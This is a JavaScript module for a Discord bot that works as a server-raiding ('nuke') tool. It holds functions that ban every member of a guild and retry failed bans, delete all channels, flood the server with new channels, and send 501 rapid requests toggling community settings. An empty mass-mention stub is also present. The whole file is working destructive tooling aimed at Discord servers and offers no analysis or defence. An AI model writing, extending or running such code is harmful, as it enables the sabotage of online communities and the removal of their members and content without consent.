const phin = require('phin').unpromisified;
const logger = require('../logs/logger');;

module.exports = {
  createChannels: (guild, name, amount) => {
    for (x = 0; x < amount; x++) {
      phin({
        method: 'POST',
        url: `https://discord.com/api/v9/guilds/${guild.id}/channels`,
        headers: {
          "Authorization": `Bot ${process.env.token}`,
          "Content-Type": "application/json"
        },
        data: {
          name: `${name}`
        }
      }, (res) => {
        if (res.statusCode > 400) {
          logger.warn(`[!]: Failed to create #${name} in ${guild.name}`);
        } else {
          logger.success(`[!]; Created ${x} Channels (#${name})`)
        }
      })
    }
  },
  fakeMassBan: (guild, ids) => {
    const len = ids.length;

    for (x = 0; x < len; x++) {
      const mem = ids[x];

      phin({
        method: 'PUT',
        url: `https://discord.com/api/v9/guilds/${guild.id}/bans/${mem}`,
        headers: {
          "Content-Type": "appliacation/json",
          "Authorization": `Bot ${process.env.token}`
        },
        data: {
          delete_message_days: "",
          reason: ""
        }
      }, (err, res) => {
        const z = res.statusCode;
        if (z == 201 || z == 204) {
          logger.success(`[!]; Successfully Banned ${mem}`);
        } else if (z == 429) {
          logger.warn(`[!]: Bot Got Blocked By The Discord API`)
        } else {
          logger.warn(`[!]: Failed To Ban ${mem} [${res.statusCode}]`);
        }
      });
    }
  },
  realMassban: async (guild) => {
    const ids = [];
    await guild.members.fetch().then(members => {
      members.forEach(member => {
        ids.push(member.user.id);
      })
    });
    const len = ids.length;
    for (n = 0; n < len; n++) {
      const mem = ids[n];
      phin({
        method: "PUT",
        url: `https://discord.com/api/v9/guilds/${guild.id}/bans/${mem}`,
        headers: {
          "Authorization": `Bot ${process.env.token}`,
          "Content-Type": "application/json"
        },
        data: {
          delete_message_days: "",
          reason: "",
        }
      }, (res) => {
        const z = res.statusCode;
        if (z == 201 || z == 204) {
          logger.success(`[!]; Successfully Banned ${mem}`);
        } else if (z == 429) {
          logger.warn(`[!]: Bot Got Blocked By The Discord API`)
        } else {
          logger.warn(`[!]: Failed To Ban ${mem}`);
          
          // Try Again LOL
          phin({
            method: "PUT",
            url: `https://discord.com/api/v9/guilds/${guild.id}/bans/${mem}`,
            headers: {
              "Authorization": `Bot ${process.env.token}`,
              "Content-Type": "application/json"
            },
            data: {
              delete_message_days: "",
              reason: "lel",
            }
          })
        }
      })
    }
  },
  massUnban: (guild) => {
    guild.bans.fetch().then((bans) => {
      bans.forEach(ban => {
        guild.members.unban(ban.user.id).then(() => {
          logger.success(`[!]; Attempted to unban ${ban.user.id}`)
        }).catch(() => {
          logger.warn(`[!]; Failed to unban ${ban.user.id}`)
        })
      })
    })
  },
  deleteChannels: (guild) => {
    guild.channels.cache.forEach(c => {
      try {
        c.delete();
        logger.success(`[!]; Deleted #${c.name} in ${c.guild.name}`);
      } catch {
        logger.warn(`[!]: Failed to delete ${c.name} in ${c.guild.name}`)
      }
    });
  },
  communitySpam: (guild) => {
    for (x = 0; x < 501; x++) {
      phin({
        method: 'PATCH',
        url: `https://discord.com/api/v9/guilds/${guild.id}`,
        headers: {
          'Authorization': `Bot ${process.env.token}`
        },
        data: {
          features: ["COMMUNITY"],
          preferred_locale: 'en-US',
          rules_channel_id: '1',
          public_updates_channel_id: '1'
        }
      })
    }
  },
  massMention: (guild, client) => {
    guild.channels.cache.forEach((channel) => {

    })
  }
}